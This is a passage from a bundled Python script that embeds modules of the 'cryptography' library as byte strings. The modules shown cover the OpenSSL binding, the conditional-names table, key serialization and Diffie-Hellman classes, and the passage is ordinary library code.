typing.List["_OpenSSLErrorWithText"]\r\n    ) -> None:\r\n        super(InternalError, self).__init__(msg)\r\n        self.err_code = err_code\r\n\r\n\r\nclass InvalidKey(Exception):\r\n    pass\r\n')
    __stickytape_write_module('cryptography/hazmat/bindings/openssl/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n')
    __stickytape_write_module('cryptography/hazmat/bindings/openssl/binding.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport threading\r\nimport types\r\nimport typing\r\nimport warnings\r\n\r\nimport cryptography\r\nfrom cryptography import utils\r\nfrom cryptography.exceptions import InternalError\r\nfrom cryptography.hazmat.bindings._openssl import ffi, lib\r\nfrom cryptography.hazmat.bindings.openssl._conditional import CONDITIONAL_NAMES\r\n\r\n_OpenSSLErrorWithText = typing.NamedTuple(\r\n    "_OpenSSLErrorWithText",\r\n    [("code", int), ("lib", int), ("reason", int), ("reason_text", bytes)],\r\n)\r\n\r\n\r\nclass _OpenSSLError:\r\n    def __init__(self, code: int, lib: int, reason: int):\r\n        self._code = code\r\n        self._lib = lib\r\n        self._reason = reason\r\n\r\n    def _lib_reason_match(self, lib: int, reason: int) -> bool:\r\n        return lib == self.lib and reason == self.reason\r\n\r\n    @property\r\n    def code(self) -> int:\r\n        return self._code\r\n\r\n    @property\r\n    def lib(self) -> int:\r\n        return self._lib\r\n\r\n    @property\r\n    def reason(self) -> int:\r\n        return self._reason\r\n\r\n\r\ndef _consume_errors(lib) -> typing.List[_OpenSSLError]:\r\n    errors = []\r\n    while True:\r\n        code: int = lib.ERR_get_error()\r\n        if code == 0:\r\n            break\r\n\r\n        err_lib: int = lib.ERR_GET_LIB(code)\r\n        err_reason: int = lib.ERR_GET_REASON(code)\r\n\r\n        errors.append(_OpenSSLError(code, err_lib, err_reason))\r\n\r\n    return errors\r\n\r\n\r\ndef _errors_with_text(\r\n    errors: typing.List[_OpenSSLError],\r\n) -> typing.List[_OpenSSLErrorWithText]:\r\n    errors_with_text = []\r\n    for err in errors:\r\n        buf = ffi.new("char[]", 256)\r\n        lib.ERR_error_string_n(err.code, buf, len(buf))\r\n        err_text_reason: bytes = ffi.string(buf)\r\n\r\n        errors_with_text.append(\r\n            _OpenSSLErrorWithText(\r\n                err.code, err.lib, err.reason, err_text_reason\r\n            )\r\n        )\r\n\r\n    return errors_with_text\r\n\r\n\r\ndef _consume_errors_with_text(lib):\r\n    return _errors_with_text(_consume_errors(lib))\r\n\r\n\r\ndef _openssl_assert(\r\n    lib, ok: bool, errors: typing.Optional[typing.List[_OpenSSLError]] = None\r\n) -> None:\r\n    if not ok:\r\n        if errors is None:\r\n            errors = _consume_errors(lib)\r\n        errors_with_text = _errors_with_text(errors)\r\n\r\n        raise InternalError(\r\n            "Unknown OpenSSL error. This error is commonly encountered when "\r\n            "another library is not cleaning up the OpenSSL error stack. If "\r\n            "you are using cryptography with another library that uses "\r\n            "OpenSSL try disabling it before reporting a bug. Otherwise "\r\n            "please file an issue at https://github.com/pyca/cryptography/"\r\n            "issues with information on how to reproduce "\r\n            "this. ({0!r})".format(errors_with_text),\r\n            errors_with_text,\r\n        )\r\n\r\n\r\ndef build_conditional_library(lib, conditional_names):\r\n    conditional_lib = types.ModuleType("lib")\r\n    conditional_lib._original_lib = lib  # type: ignore[attr-defined]\r\n    excluded_names = set()\r\n    for condition, names_cb in conditional_names.items():\r\n        if not getattr(lib, condition):\r\n            excluded_names.update(names_cb())\r\n\r\n    for attr in dir(lib):\r\n        if attr not in excluded_names:\r\n            setattr(conditional_lib, attr, getattr(lib, attr))\r\n\r\n    return conditional_lib\r\n\r\n\r\nclass Binding:\r\n    """\r\n    OpenSSL API wrapper.\r\n    """\r\n\r\n    lib: typing.ClassVar = None\r\n    ffi = ffi\r\n    _lib_loaded = False\r\n    _init_lock = threading.Lock()\r\n    _legacy_provider: typing.Any = None\r\n    _default_provider: typing.Any = None\r\n\r\n    def __init__(self):\r\n        self._ensure_ffi_initialized()\r\n\r\n    def _enable_fips(self) -> None:\r\n        # This function enables FIPS mode for OpenSSL 3.0.0 on installs that\r\n        # have the FIPS provider installed properly.\r\n        _openssl_assert(self.lib, self.lib.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER)\r\n        self._base_provider = self.lib.OSSL_PROVIDER_load(\r\n            self.ffi.NULL, b"base"\r\n        )\r\n        _openssl_assert(self.lib, self._base_provider != self.ffi.NULL)\r\n        self.lib._fips_provider = self.lib.OSSL_PROVIDER_load(\r\n            self.ffi.NULL, b"fips"\r\n        )\r\n        _openssl_assert(self.lib, self.lib._fips_provider != self.ffi.NULL)\r\n\r\n        res = self.lib.EVP_default_properties_enable_fips(self.ffi.NULL, 1)\r\n        _openssl_assert(self.lib, res == 1)\r\n\r\n    @classmethod\r\n    def _register_osrandom_engine(cls):\r\n        # Clear any errors extant in the queue before we start. In many\r\n        # scenarios other things may be interacting with OpenSSL in the same\r\n        # process space and it has proven untenable to assume that they will\r\n        # reliably clear the error queue. Once we clear it here we will\r\n        # error on any subsequent unexpected item in the stack.\r\n        cls.lib.ERR_clear_error()\r\n        if cls.lib.CRYPTOGRAPHY_NEEDS_OSRANDOM_ENGINE:\r\n            result = cls.lib.Cryptography_add_osrandom_engine()\r\n            _openssl_assert(cls.lib, result in (1, 2))\r\n\r\n    @classmethod\r\n    def _ensure_ffi_initialized(cls):\r\n        with cls._init_lock:\r\n            if not cls._lib_loaded:\r\n                cls.lib = build_conditional_library(lib, CONDITIONAL_NAMES)\r\n                cls._lib_loaded = True\r\n                cls._register_osrandom_engine()\r\n                # As of OpenSSL 3.0.0 we must register a legacy cipher provider\r\n                # to get RC2 (needed for junk asymmetric private key\r\n                # serialization), RC4, Blowfish, IDEA, SEED, etc. These things\r\n                # are ugly legacy, but we aren\'t going to get rid of them\r\n                # any time soon.\r\n                if cls.lib.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER:\r\n                    cls._legacy_provider = cls.lib.OSSL_PROVIDER_load(\r\n                        cls.ffi.NULL, b"legacy"\r\n                    )\r\n                    _openssl_assert(\r\n                        cls.lib, cls._legacy_provider != cls.ffi.NULL\r\n                    )\r\n                    cls._default_provider = cls.lib.OSSL_PROVIDER_load(\r\n                        cls.ffi.NULL, b"default"\r\n                    )\r\n                    _openssl_assert(\r\n                        cls.lib, cls._default_provider != cls.ffi.NULL\r\n                    )\r\n\r\n    @classmethod\r\n    def init_static_locks(cls):\r\n        cls._ensure_ffi_initialized()\r\n\r\n\r\ndef _verify_openssl_version(lib):\r\n    if (\r\n        lib.CRYPTOGRAPHY_OPENSSL_LESS_THAN_111\r\n        and not lib.CRYPTOGRAPHY_IS_LIBRESSL\r\n        and not lib.CRYPTOGRAPHY_IS_BORINGSSL\r\n    ):\r\n        warnings.warn(\r\n            "OpenSSL version 1.1.0 is no longer supported by the OpenSSL "\r\n            "project, please upgrade. The next release of cryptography will "\r\n            "be the last to support compiling with OpenSSL 1.1.0.",\r\n            utils.DeprecatedIn37,\r\n        )\r\n\r\n\r\ndef _verify_package_version(version):\r\n    # Occasionally we run into situations where the version of the Python\r\n    # package does not match the version of the shared object that is loaded.\r\n    # This may occur in environments where multiple versions of cryptography\r\n    # are installed and available in the python path. To avoid errors cropping\r\n    # up later this code checks that the currently imported package and the\r\n    # shared object that were loaded have the same version and raise an\r\n    # ImportError if they do not\r\n    so_package_version = ffi.string(lib.CRYPTOGRAPHY_PACKAGE_VERSION)\r\n    if version.encode("ascii") != so_package_version:\r\n        raise ImportError(\r\n            "The version of cryptography does not match the loaded "\r\n            "shared object. This can happen if you have multiple copies of "\r\n            "cryptography installed in your Python path. Please try creating "\r\n            "a new virtual environment to resolve this issue. "\r\n            "Loaded python version: {}, shared object version: {}".format(\r\n                version, so_package_version\r\n            )\r\n        )\r\n\r\n\r\n_verify_package_version(cryptography.__version__)\r\n\r\nBinding.init_static_locks()\r\n\r\n_verify_openssl_version(Binding.lib)\r\n')
    __stickytape_write_module('cryptography/hazmat/bindings/openssl/_conditional.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\n\r\ndef cryptography_has_ec2m() -> typing.List[str]:\r\n    return [\r\n        "EC_POINT_get_affine_coordinates_GF2m",\r\n    ]\r\n\r\n\r\ndef cryptography_has_ssl3_method() -> typing.List[str]:\r\n    return [\r\n        "SSLv3_method",\r\n        "SSLv3_client_method",\r\n        "SSLv3_server_method",\r\n    ]\r\n\r\n\r\ndef cryptography_has_110_verification_params() -> typing.List[str]:\r\n    return ["X509_CHECK_FLAG_NEVER_CHECK_SUBJECT"]\r\n\r\n\r\ndef cryptography_has_set_cert_cb() -> typing.List[str]:\r\n    return [\r\n        "SSL_CTX_set_cert_cb",\r\n        "SSL_set_cert_cb",\r\n    ]\r\n\r\n\r\ndef cryptography_has_ssl_st() -> typing.List[str]:\r\n    return [\r\n        "SSL_ST_BEFORE",\r\n        "SSL_ST_OK",\r\n        "SSL_ST_INIT",\r\n        "SSL_ST_RENEGOTIATE",\r\n    ]\r\n\r\n\r\ndef cryptography_has_tls_st() -> typing.List[str]:\r\n    return [\r\n        "TLS_ST_BEFORE",\r\n        "TLS_ST_OK",\r\n    ]\r\n\r\n\r\ndef cryptography_has_scrypt() -> typing.List[str]:\r\n    return [\r\n        "EVP_PBE_scrypt",\r\n    ]\r\n\r\n\r\ndef cryptography_has_evp_pkey_dhx() -> typing.List[str]:\r\n    return [\r\n        "EVP_PKEY_DHX",\r\n    ]\r\n\r\n\r\ndef cryptography_has_mem_functions() -> typing.List[str]:\r\n    return [\r\n        "Cryptography_CRYPTO_set_mem_functions",\r\n    ]\r\n\r\n\r\ndef cryptography_has_x509_store_ctx_get_issuer() -> typing.List[str]:\r\n    return [\r\n        "X509_STORE_get_get_issuer",\r\n        "X509_STORE_set_get_issuer",\r\n    ]\r\n\r\n\r\ndef cryptography_has_ed448() -> typing.List[str]:\r\n    return [\r\n        "EVP_PKEY_ED448",\r\n        "NID_ED448",\r\n    ]\r\n\r\n\r\ndef cryptography_has_ed25519() -> typing.List[str]:\r\n    return [\r\n        "NID_ED25519",\r\n        "EVP_PKEY_ED25519",\r\n    ]\r\n\r\n\r\ndef cryptography_has_poly1305() -> typing.List[str]:\r\n    return [\r\n        "NID_poly1305",\r\n        "EVP_PKEY_POLY1305",\r\n    ]\r\n\r\n\r\ndef cryptography_has_oneshot_evp_digest_sign_verify() -> typing.List[str]:\r\n    return [\r\n        "EVP_DigestSign",\r\n        "EVP_DigestVerify",\r\n    ]\r\n\r\n\r\ndef cryptography_has_evp_digestfinal_xof() -> typing.List[str]:\r\n    return [\r\n        "EVP_DigestFinalXOF",\r\n    ]\r\n\r\n\r\ndef cryptography_has_evp_pkey_get_set_tls_encodedpoint() -> typing.List[str]:\r\n    return [\r\n        "EVP_PKEY_get1_tls_encodedpoint",\r\n        "EVP_PKEY_set1_tls_encodedpoint",\r\n    ]\r\n\r\n\r\ndef cryptography_has_fips() -> typing.List[str]:\r\n    return [\r\n        "FIPS_mode_set",\r\n        "FIPS_mode",\r\n    ]\r\n\r\n\r\ndef cryptography_has_psk() -> typing.List[str]:\r\n    return [\r\n        "SSL_CTX_use_psk_identity_hint",\r\n        "SSL_CTX_set_psk_server_callback",\r\n        "SSL_CTX_set_psk_client_callback",\r\n    ]\r\n\r\n\r\ndef cryptography_has_psk_tlsv13() -> typing.List[str]:\r\n    return [\r\n        "SSL_CTX_set_psk_find_session_callback",\r\n        "SSL_CTX_set_psk_use_session_callback",\r\n        "Cryptography_SSL_SESSION_new",\r\n        "SSL_CIPHER_find",\r\n        "SSL_SESSION_set1_master_key",\r\n        "SSL_SESSION_set_cipher",\r\n        "SSL_SESSION_set_protocol_version",\r\n    ]\r\n\r\n\r\ndef cryptography_has_custom_ext() -> typing.List[str]:\r\n    return [\r\n        "SSL_CTX_add_client_custom_ext",\r\n        "SSL_CTX_add_server_custom_ext",\r\n        "SSL_extension_supported",\r\n    ]\r\n\r\n\r\ndef cryptography_has_openssl_cleanup() -> typing.List[str]:\r\n    return [\r\n        "OPENSSL_cleanup",\r\n    ]\r\n\r\n\r\ndef cryptography_has_tlsv13() -> typing.List[str]:\r\n    return [\r\n        "TLS1_3_VERSION",\r\n        "SSL_OP_NO_TLSv1_3",\r\n    ]\r\n\r\n\r\ndef cryptography_has_tlsv13_functions() -> typing.List[str]:\r\n    return [\r\n        "SSL_VERIFY_POST_HANDSHAKE",\r\n        "SSL_CTX_set_ciphersuites",\r\n        "SSL_verify_client_post_handshake",\r\n        "SSL_CTX_set_post_handshake_auth",\r\n        "SSL_set_post_handshake_auth",\r\n        "SSL_SESSION_get_max_early_data",\r\n        "SSL_write_early_data",\r\n        "SSL_read_early_data",\r\n        "SSL_CTX_set_max_early_data",\r\n    ]\r\n\r\n\r\ndef cryptography_has_keylog() -> typing.List[str]:\r\n    return [\r\n        "SSL_CTX_set_keylog_callback",\r\n        "SSL_CTX_get_keylog_callback",\r\n    ]\r\n\r\n\r\ndef cryptography_has_raw_key() -> typing.List[str]:\r\n    return [\r\n        "EVP_PKEY_new_raw_private_key",\r\n        "EVP_PKEY_new_raw_public_key",\r\n        "EVP_PKEY_get_raw_private_key",\r\n        "EVP_PKEY_get_raw_public_key",\r\n    ]\r\n\r\n\r\ndef cryptography_has_engine() -> typing.List[str]:\r\n    return [\r\n        "ENGINE_by_id",\r\n        "ENGINE_init",\r\n        "ENGINE_finish",\r\n        "ENGINE_get_default_RAND",\r\n        "ENGINE_set_default_RAND",\r\n        "ENGINE_unregister_RAND",\r\n        "ENGINE_ctrl_cmd",\r\n        "ENGINE_free",\r\n        "ENGINE_get_name",\r\n        "Cryptography_add_osrandom_engine",\r\n        "ENGINE_ctrl_cmd_string",\r\n        "ENGINE_load_builtin_engines",\r\n        "ENGINE_load_private_key",\r\n        "ENGINE_load_public_key",\r\n        "SSL_CTX_set_client_cert_engine",\r\n    ]\r\n\r\n\r\ndef cryptography_has_verified_chain() -> typing.List[str]:\r\n    return [\r\n        "SSL_get0_verified_chain",\r\n    ]\r\n\r\n\r\ndef cryptography_has_srtp() -> typing.List[str]:\r\n    return [\r\n        "SSL_CTX_set_tlsext_use_srtp",\r\n        "SSL_set_tlsext_use_srtp",\r\n        "SSL_get_selected_srtp_profile",\r\n    ]\r\n\r\n\r\ndef cryptography_has_get_proto_version() -> typing.List[str]:\r\n    return [\r\n        "SSL_CTX_get_min_proto_version",\r\n        "SSL_CTX_get_max_proto_version",\r\n        "SSL_get_min_proto_version",\r\n        "SSL_get_max_proto_version",\r\n    ]\r\n\r\n\r\ndef cryptography_has_providers() -> typing.List[str]:\r\n    return [\r\n        "OSSL_PROVIDER_load",\r\n        "OSSL_PROVIDER_unload",\r\n        "ERR_LIB_PROV",\r\n        "PROV_R_WRONG_FINAL_BLOCK_LENGTH",\r\n        "PROV_R_BAD_DECRYPT",\r\n    ]\r\n\r\n\r\ndef cryptography_has_op_no_renegotiation() -> typing.List[str]:\r\n    return [\r\n        "SSL_OP_NO_RENEGOTIATION",\r\n    ]\r\n\r\n\r\ndef cryptography_has_dtls_get_data_mtu() -> typing.List[str]:\r\n    return [\r\n        "DTLS_get_data_mtu",\r\n    ]\r\n\r\n\r\ndef cryptography_has_300_fips() -> typing.List[str]:\r\n    return [\r\n        "EVP_default_properties_is_fips_enabled",\r\n        "EVP_default_properties_enable_fips",\r\n    ]\r\n\r\n\r\ndef cryptography_has_ssl_cookie() -> typing.List[str]:\r\n    return [\r\n        "SSL_OP_COOKIE_EXCHANGE",\r\n        "DTLSv1_listen",\r\n        "SSL_CTX_set_cookie_generate_cb",\r\n        "SSL_CTX_set_cookie_verify_cb",\r\n    ]\r\n\r\n\r\ndef cryptography_has_pkcs7_funcs() -> typing.List[str]:\r\n    return [\r\n        "SMIME_write_PKCS7",\r\n        "PEM_write_bio_PKCS7_stream",\r\n        "PKCS7_sign_add_signer",\r\n        "PKCS7_final",\r\n        "PKCS7_verify",\r\n        "SMIME_read_PKCS7",\r\n        "PKCS7_get0_signers",\r\n    ]\r\n\r\n\r\ndef cryptography_has_bn_flags() -> typing.List[str]:\r\n    return [\r\n        "BN_FLG_CONSTTIME",\r\n        "BN_set_flags",\r\n        "BN_prime_checks_for_size",\r\n    ]\r\n\r\n\r\ndef cryptography_has_evp_pkey_dh() -> typing.List[str]:\r\n    return [\r\n        "EVP_PKEY_set1_DH",\r\n    ]\r\n\r\n\r\ndef cryptography_has_300_evp_cipher() -> typing.List[str]:\r\n    return ["EVP_CIPHER_fetch", "EVP_CIPHER_free"]\r\n\r\n\r\ndef cryptography_has_unexpected_eof_while_reading() -> typing.List[str]:\r\n    return ["SSL_R_UNEXPECTED_EOF_WHILE_READING"]\r\n\r\n\r\n# This is a mapping of\r\n# {condition: function-returning-names-dependent-on-that-condition} so we can\r\n# loop over them and delete unsupported names at runtime. It will be removed\r\n# when cffi supports #if in cdef. We use functions instead of just a dict of\r\n# lists so we can use coverage to measure which are used.\r\nCONDITIONAL_NAMES = {\r\n    "Cryptography_HAS_EC2M": cryptography_has_ec2m,\r\n    "Cryptography_HAS_SSL3_METHOD": cryptography_has_ssl3_method,\r\n    "Cryptography_HAS_110_VERIFICATION_PARAMS": (\r\n        cryptography_has_110_verification_params\r\n    ),\r\n    "Cryptography_HAS_SET_CERT_CB": cryptography_has_set_cert_cb,\r\n    "Cryptography_HAS_SSL_ST": cryptography_has_ssl_st,\r\n    "Cryptography_HAS_TLS_ST": cryptography_has_tls_st,\r\n    "Cryptography_HAS_SCRYPT": cryptography_has_scrypt,\r\n    "Cryptography_HAS_EVP_PKEY_DHX": cryptography_has_evp_pkey_dhx,\r\n    "Cryptography_HAS_MEM_FUNCTIONS": cryptography_has_mem_functions,\r\n    "Cryptography_HAS_X509_STORE_CTX_GET_ISSUER": (\r\n        cryptography_has_x509_store_ctx_get_issuer\r\n    ),\r\n    "Cryptography_HAS_ED448": cryptography_has_ed448,\r\n    "Cryptography_HAS_ED25519": cryptography_has_ed25519,\r\n    "Cryptography_HAS_POLY1305": cryptography_has_poly1305,\r\n    "Cryptography_HAS_ONESHOT_EVP_DIGEST_SIGN_VERIFY": (\r\n        cryptography_has_oneshot_evp_digest_sign_verify\r\n    ),\r\n    "Cryptography_HAS_EVP_PKEY_get_set_tls_encodedpoint": (\r\n        cryptography_has_evp_pkey_get_set_tls_encodedpoint\r\n    ),\r\n    "Cryptography_HAS_FIPS": cryptography_has_fips,\r\n    "Cryptography_HAS_PSK": cryptography_has_psk,\r\n    "Cryptography_HAS_PSK_TLSv1_3": cryptography_has_psk_tlsv13,\r\n    "Cryptography_HAS_CUSTOM_EXT": cryptography_has_custom_ext,\r\n    "Cryptography_HAS_OPENSSL_CLEANUP": cryptography_has_openssl_cleanup,\r\n    "Cryptography_HAS_TLSv1_3": cryptography_has_tlsv13,\r\n    "Cryptography_HAS_TLSv1_3_FUNCTIONS": cryptography_has_tlsv13_functions,\r\n    "Cryptography_HAS_KEYLOG": cryptography_has_keylog,\r\n    "Cryptography_HAS_RAW_KEY": cryptography_has_raw_key,\r\n    "Cryptography_HAS_EVP_DIGESTFINAL_XOF": (\r\n        cryptography_has_evp_digestfinal_xof\r\n    ),\r\n    "Cryptography_HAS_ENGINE": cryptography_has_engine,\r\n    "Cryptography_HAS_VERIFIED_CHAIN": cryptography_has_verified_chain,\r\n    "Cryptography_HAS_SRTP": cryptography_has_srtp,\r\n    "Cryptography_HAS_GET_PROTO_VERSION": cryptography_has_get_proto_version,\r\n    "Cryptography_HAS_PROVIDERS": cryptography_has_providers,\r\n    "Cryptography_HAS_OP_NO_RENEGOTIATION": (\r\n        cryptography_has_op_no_renegotiation\r\n    ),\r\n    "Cryptography_HAS_DTLS_GET_DATA_MTU": cryptography_has_dtls_get_data_mtu,\r\n    "Cryptography_HAS_300_FIPS": cryptography_has_300_fips,\r\n    "Cryptography_HAS_SSL_COOKIE": cryptography_has_ssl_cookie,\r\n    "Cryptography_HAS_PKCS7_FUNCS": cryptography_has_pkcs7_funcs,\r\n    "Cryptography_HAS_BN_FLAGS": cryptography_has_bn_flags,\r\n    "Cryptography_HAS_EVP_PKEY_DH": cryptography_has_evp_pkey_dh,\r\n    "Cryptography_HAS_300_EVP_CIPHER": cryptography_has_300_evp_cipher,\r\n    "Cryptography_HAS_UNEXPECTED_EOF_WHILE_READING": (\r\n        cryptography_has_unexpected_eof_while_reading\r\n    ),\r\n}\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/serialization/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nfrom cryptography.hazmat.primitives._serialization import (\r\n    BestAvailableEncryption,\r\n    Encoding,\r\n    KeySerializationEncryption,\r\n    NoEncryption,\r\n    ParameterFormat,\r\n    PrivateFormat,\r\n    PublicFormat,\r\n)\r\nfrom cryptography.hazmat.primitives.serialization.base import (\r\n    load_der_parameters,\r\n    load_der_private_key,\r\n    load_der_public_key,\r\n    load_pem_parameters,\r\n    load_pem_private_key,\r\n    load_pem_public_key,\r\n)\r\nfrom cryptography.hazmat.primitives.serialization.ssh import (\r\n    load_ssh_private_key,\r\n    load_ssh_public_key,\r\n)\r\n\r\n\r\n__all__ = [\r\n    "load_der_parameters",\r\n    "load_der_private_key",\r\n    "load_der_public_key",\r\n    "load_pem_parameters",\r\n    "load_pem_private_key",\r\n    "load_pem_public_key",\r\n    "load_ssh_private_key",\r\n    "load_ssh_public_key",\r\n    "Encoding",\r\n    "PrivateFormat",\r\n    "PublicFormat",\r\n    "ParameterFormat",\r\n    "KeySerializationEncryption",\r\n    "BestAvailableEncryption",\r\n    "NoEncryption",\r\n]\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/_serialization.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport abc\r\n\r\nfrom cryptography import utils\r\n\r\n# This exists to break an import cycle. These classes are normally accessible\r\n# from the serialization module.\r\n\r\n\r\nclass Encoding(utils.Enum):\r\n    PEM = "PEM"\r\n    DER = "DER"\r\n    OpenSSH = "OpenSSH"\r\n    Raw = "Raw"\r\n    X962 = "ANSI X9.62"\r\n    SMIME = "S/MIME"\r\n\r\n\r\nclass PrivateFormat(utils.Enum):\r\n    PKCS8 = "PKCS8"\r\n    TraditionalOpenSSL = "TraditionalOpenSSL"\r\n    Raw = "Raw"\r\n    OpenSSH = "OpenSSH"\r\n\r\n\r\nclass PublicFormat(utils.Enum):\r\n    SubjectPublicKeyInfo = "X.509 subjectPublicKeyInfo with PKCS#1"\r\n    PKCS1 = "Raw PKCS#1"\r\n    OpenSSH = "OpenSSH"\r\n    Raw = "Raw"\r\n    CompressedPoint = "X9.62 Compressed Point"\r\n    UncompressedPoint = "X9.62 Uncompressed Point"\r\n\r\n\r\nclass ParameterFormat(utils.Enum):\r\n    PKCS3 = "PKCS3"\r\n\r\n\r\nclass KeySerializationEncryption(metaclass=abc.ABCMeta):\r\n    pass\r\n\r\n\r\nclass BestAvailableEncryption(KeySerializationEncryption):\r\n    def __init__(self, password: bytes):\r\n        if not isinstance(password, bytes) or len(password) == 0:\r\n            raise ValueError("Password must be 1 or more bytes.")\r\n\r\n        self.password = password\r\n\r\n\r\nclass NoEncryption(KeySerializationEncryption):\r\n    pass\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/serialization/base.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport typing\r\n\r\nfrom cryptography.hazmat.primitives.asymmetric import dh\r\nfrom cryptography.hazmat.primitives.asymmetric.types import (\r\n    PRIVATE_KEY_TYPES,\r\n    PUBLIC_KEY_TYPES,\r\n)\r\n\r\n\r\ndef load_pem_private_key(\r\n    data: bytes,\r\n    password: typing.Optional[bytes],\r\n    backend: typing.Any = None,\r\n) -> PRIVATE_KEY_TYPES:\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.load_pem_private_key(data, password)\r\n\r\n\r\ndef load_pem_public_key(\r\n    data: bytes, backend: typing.Any = None\r\n) -> PUBLIC_KEY_TYPES:\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.load_pem_public_key(data)\r\n\r\n\r\ndef load_pem_parameters(\r\n    data: bytes, backend: typing.Any = None\r\n) -> "dh.DHParameters":\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.load_pem_parameters(data)\r\n\r\n\r\ndef load_der_private_key(\r\n    data: bytes,\r\n    password: typing.Optional[bytes],\r\n    backend: typing.Any = None,\r\n) -> PRIVATE_KEY_TYPES:\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.load_der_private_key(data, password)\r\n\r\n\r\ndef load_der_public_key(\r\n    data: bytes, backend: typing.Any = None\r\n) -> PUBLIC_KEY_TYPES:\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.load_der_public_key(data)\r\n\r\n\r\ndef load_der_parameters(\r\n    data: bytes, backend: typing.Any = None\r\n) -> "dh.DHParameters":\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.load_der_parameters(data)\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/dh.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport typing\r\n\r\nfrom cryptography.hazmat.primitives import _serialization\r\n\r\n\r\n_MIN_MODULUS_SIZE = 512\r\n\r\n\r\ndef generate_parameters(\r\n    generator: int, key_size: int, backend: typing.Any = None\r\n) -> "DHParameters":\r\n    from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    return ossl.generate_dh_parameters(generator, key_size)\r\n\r\n\r\nclass DHParameterNumbers:\r\n    def __init__(self, p: int, g: int, q: typing.Optional[int] = None) -> None:\r\n        if not isinstance(p, int) or not isinstance(g, int):\r\n            raise TypeError("p and g must be integers")\r\n        if q is not None and not isinstance(q, int):\r\n            raise TypeError("q must be integer or None")\r\n\r\n        if g < 2:\r\n            raise ValueError("DH generator must be 2 or greater")\r\n\r\n        if p.bit_length() < _MIN_MODULUS_SIZE:\r\n            raise ValueError(\r\n                "p (modulus) must be at least {}-bit".format(_MIN_MODULUS_SIZE)\r\n            )\r\n\r\n        self._p = p\r\n        self._g = g\r\n        self._q = q\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, DHParameterNumbers):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self._p == other._p and self._g == other._g and self._q == other._q\r\n        )\r\n\r\n    def parameters(self, backend: typing.Any = None) -> "DHParameters":\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.load_dh_parameter_numbers(self)\r\n\r\n    @property\r\n    def p(self) -> int:\r\n        return self._p\r\n\r\n    @property\r\n    def g(self) -> int:\r\n        return self._g\r\n\r\n    @property\r\n    def q(self) -> typing.Optional[int]:\r\n        return self._q\r\n\r\n\r\nclass DHPublicNumbers:\r\n    def __init__(self, y: int, parameter_numbers: DHParameterNumbers) -> None:\r\n        if not isinstance(y, int):\r\n            raise TypeError("y must be an integer.")\r\n\r\n        if not isinstance(parameter_numbers, DHParameterNumbers):\r\n            raise TypeError(\r\n                "parameters must be an instance of DHParameterNumbers."\r\n            )\r\n\r\n        self._y = y\r\n        self._parameter_numbers = parameter_numbers\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, DHPublicNumbers):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self._y == other._y\r\n            and self._parameter_numbers == other._parameter_numbers\r\n        )\r\n\r\n    def public_key(self, backend: typing.Any = None) -> "DHPublicKey":\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.load_dh_public_numbers(self)\r\n\r\n    @property\r\n    def y(self) -> int:\r\n        return self._y\r\n\r\n    @property\r\n    def parameter_numbers(self) -> DHParameterNumbers:\r\n        return self._parameter_numbers\r\n\r\n\r\nclass DHPrivateNumbers:\r\n    def __init__(self, x: int, public_numbers: DHPublicNumbers) -> None:\r\n        if not isinstance(x, int):\r\n            raise TypeError("x must be an integer.")\r\n\r\n        if not isinstance(public_numbers, DHPublicNumbers):\r\n            raise TypeError(\r\n                "public_numbers must be an instance of " "DHPublicNumbers."\r\n            )\r\n\r\n        self._x = x\r\n        self._public_numbers = public_numbers\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, DHPrivateNumbers):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self._x == other._x\r\n            and self._public_numbers == other._public_numbers\r\n        )\r\n\r\n    def private_key(self, backend: typing.Any = None) -> "DHPrivateKey":\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.load_dh_private_numbers(self)\r\n\r\n    @property\r\n    def public_numbers(self) -> 